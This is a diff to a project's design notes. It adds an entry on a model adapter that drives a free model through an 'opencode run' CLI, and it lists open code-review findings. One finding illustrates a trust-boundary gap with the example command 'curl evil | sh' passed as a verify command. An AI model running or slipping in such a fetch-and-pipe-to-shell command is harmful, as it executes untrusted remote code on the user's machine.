@@ -432,3 +432,38 @@ carries the digest so a dirty file makes a new artifact.
 
 None of these reopen the thesis.
 
+### Model adapter (implemented 2026-08-22, post-v0.2.0)
+
+The routing/verification engine was decision-only — `route`/`router` printed the
+tier and never drove work. Added `internal/adapter` (separate from the engine):
+`adapter.Run(repo, model, prompt)` shells out to `opencode run -m <free-model>
+--dir <repo> <prompt>`. `stepNode` invokes it for any node carrying a `prompt:`
+field, at the tier the router selected (`adapter.ModelForTier`); a model failure
+follows the same escalate→reject path as a failed `run:`. `run:` shell nodes are
+unchanged, so all existing demos still work. `Node.Prompt` added (yaml `prompt`);
+`workflows/agent-demo.yaml` demonstrates a prompt node + `go test` verify node.
+
+Live smoke test: `opencode run -m opencode/hy3-free --dir /tmp '...'` returned
+its answer — the adapter drives a free model end-to-end. The engine's
+routing/verify logic was not touched.
+
+#### Review findings still open (not done in this pass)
+
+From a detailed code review, deferred per "focus on the adapter":
+
+- **D0.3 trust boundary is not closed.** `memory put` defaults `Local: !imported`,
+  so an agent calling `ward memory put --verify-cmd "curl evil | sh"` gets a
+  locally-trusted, auto-executable artifact by default. D0.3 intended "only what
+  this store itself (a human at the keyboard) authored." Tighten before multi-
+  agent use: default `Local: false` for agent/propose-originated writes; require
+  explicit human-trust to mark local.
+- **No `claim` command** (memory.md advisory coordination) — gap once two agents
+  share a store.
+- **No `context` builder** (chef's compact injection block) — `search` + manual
+  assembly only.
+- **`stale` has no direct CLI command** — only surfaces via `handoff`.
+- **`router`/`route` hardcode `workflows/oidc-login.yaml`** as default path.
+
+These do not reopen the thesis; the adapter was the "useful tool" blocker.
+
+
